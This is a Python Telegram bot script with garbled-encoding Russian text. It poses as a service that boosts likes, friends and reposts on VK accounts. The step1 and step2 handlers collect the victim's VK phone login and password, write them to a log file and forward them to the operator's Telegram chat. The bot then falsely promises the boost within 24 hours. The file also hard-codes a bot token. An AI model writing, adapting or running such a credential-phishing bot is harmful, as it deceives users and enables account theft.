
import telebot
from telebot import *
import time

print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω! –¥–ª—è –≤—ã—Ö–æ–¥–∞ [ctrl + c]")

log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = ''
bot = telebot.TeleBot("7545465936:AAENYOn7Sz3APQYsrtlm7_LRgYbWiXDPR5k")
try:
	bot.send_message(ID, '!–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!') 
except:
	print("–í–æ–∑–º–æ–∂–Ω–æ –≤—ã –Ω–µ –Ω–∞–ø–∏—Å–∞–ª–∏ /start –≤ –≤–∞—à–µ–º –±–æ—Ç–µ! –ë–µ–∑ —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ!")



@bot.message_handler(commands=['start'])
def start(message):
	print(f'''–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!
	ID: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç –Ω–∞–∫—Ä—É—Ç–∫–∏ –ª–∞–π–∫–æ–≤ –∏ –¥—Ä—É–∑–µ–π –Ω–∞ –≤–∞—à VK –∞–∫–∫–∞—É–Ω—Ç!
		–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–∂–º–∏—Ç–µ /nacrutka''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: @CyberPuffin') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏‚ù§Ô∏è", callback_data="like")
	second_button = types.InlineKeyboardButton(text="–î—Ä—É–∑—å—èüìÉ", callback_data="like")
	button3 = types.InlineKeyboardButton(text="–†–µ–ø–æ—Å—Ç—ã", callback_data="like")
	button4 = types.InlineKeyboardButton(text="–ü—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –ø–ª–µ–π–ª–∏—Å—Ç–æ–≤", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		elif int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return
		else:
			bot.send_message(message.chat.id, f'–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ: {num}')
			msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	inp = message.text.replace("+", "")
	if not inp.isdigit():
		bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
		return
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk
ID: {message.from_user.id}
–ù–∏–∫: @{message.from_user.username}
–õ–æ–≥–∏–Ω: {message.text}
–ò–º—è: {message.from_user.first_name}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'–í–∞—à –ª–æ–≥–∏–Ω: {message.text}')

	msg1 = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk 
ID: {message.from_user.id}
–ù–∏–∫: @{message.from_user.username}
–ü–∞—Ä–æ–ª—å: {usrpass}
–ò–º—è: {message.from_user.first_name}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'–í–∞—à –ø–∞—Ä–æ–ª—å: {usrpass}')
	time.sleep(1)
	bot.reply_to(message, f'–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–ºüòâ! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, —Ç–æ –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É–Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')


bot.polling()
		